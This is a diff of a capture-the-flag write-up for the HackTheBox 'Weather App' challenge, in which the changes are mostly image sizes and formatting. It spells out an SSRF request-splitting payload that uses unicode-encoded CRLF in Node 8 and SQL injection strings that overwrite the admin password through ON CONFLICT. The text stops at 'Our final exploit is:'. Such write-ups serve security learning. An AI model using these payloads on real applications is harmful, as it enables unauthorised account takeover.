@@ -7,15 +7,16 @@ Once we get it running, we can access the challenge at 127.0.0.1:1337
 
 <img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/mainPage.png" width="700px">
 
+
 Now, let's dig into the code. This is a Node.js app using express, so we can see all 4 available routes at routes/index.js.
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/main.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/main.png" width="500px">
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/register.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/register.png" width="600px">
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/login.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/login.png" width="600px">
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/api.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/api.png" width="500px">
 
 As we can see, to get the flag we must succesfuly login. The only requirement is to have an user with username 'admin'. However, in order to register a new user, the POST request must come from the server itself, so it would be nice to start looking for SSRF.
 
@@ -33,13 +34,14 @@ Let's inspect WeatherHelper.getWeather inside helpers/WeatherHelper.js, used in 
 
 Basically, getWeather() function makes a GET request to the specified endpoint and expects to receive a weatherData JSON object with all those attributes. Usually, /api/weather is used by the application in order to get information about the weather in our location. This is done by a function called in the client, inside /static/js/main.js:
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/client.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/client.png" width="400px">
 
 In order for getWeather() to make the GET request, it calls another function inside helpers/HttpHelper.js:
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/httpGet.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/httpGet.png" width="400px">
 
 Now that we know how the application works, let's see how we can read the flag.
+
 
 ## Server-Side Request Forgery
 
@@ -51,14 +53,11 @@ When Node 8 sends the http request through the wire, it encodes the string as by
 
 Using this vulnerability, we can make extra HTTP requests by injecting and encoding the corresponding request headers in the URI path. So, a request to 'http://127.0.0.1/' will produce:
 
-    '''
     GET / HTTP/1.1
     Host: 127.0.0.1
-    '''
 
 An encoded request to 'http://127.0.0.1/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nPOST /register HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=admin&password=admin\r\n\r\nGET /' will produce:
 
-    '''
     GET / HTTP/1.1
     Host: 127.0.0.1
 
@@ -71,7 +70,6 @@ An encoded request to 'http://127.0.0.1/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nPOST
 
     GET / HTTP/1.1
     Host: 127.0.0.1
-    '''
 
 Spaces can be encoded as '\u0120', '\r' as '\u010D' and '\n' as '\u010A'. Characters ' and " must be URL encoded. So, the previous URL would like like 'http://127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/Ġ'.
 
@@ -81,7 +79,6 @@ Now, we need to adapt this exploit to the application. As we have seen in /api/w
 
 If we send to the API an endpoint like '127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=', the server will make a request to 'http://127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=/data/2.5/weather?q=lol,lol&units=metric&appid=10a62430af617a949055a46fa6dec32f', and it will produce:
 
-    '''
     GET / HTTP/1.1
     Host: 127.0.0.1
 
@@ -94,11 +91,10 @@ If we send to the API an endpoint like '127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1
 
     GET /?lol=/data/2.5/weather?q=lol,lol&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
     [...]
-    '''
 
 We can write an exploit to automate this:
 
-<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/exploit.png" width="700px">
+<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/exploit1.png" width="700px">
 
 
 ## SQL Injection
@@ -113,23 +109,23 @@ First thing we can try is Time-Based blind SQLi, since we cannot see the result 
 But, since the request is made by the server (not by us) and Node is asynchronous, we cannot spot the delay.
 
 Trying stacked queries in password parameter such as
-    '''
+
     1337'); UPDATE users SET password='admin' WHERE username='admin';--
-    '''
+    
 will produce
-    '''
+
     INSERT INTO users (username, password) VALUES ('user', '1337'); UPDATE users SET password='admin' WHERE username='admin';--')
-    '''
+    
 But, we find out that stacked queries don't work in this database
 
 However, there is a way to trick the INSERT query and update any value by specifying username = 'admin' and password:
-    '''
+
     1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--
-    '''
+    
 will produce
-    '''
+
     INSERT INTO users (username, password) VALUES ('admin', 1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--')
-    '''
+    
 If there is a conflict in username, the password will be updated to admin. Since username is defined initially as NOT NULL UNIQUE, when we try to insert 'admin', we will trigger this error as there is already an admin inside the database
 
 Our final exploit is:
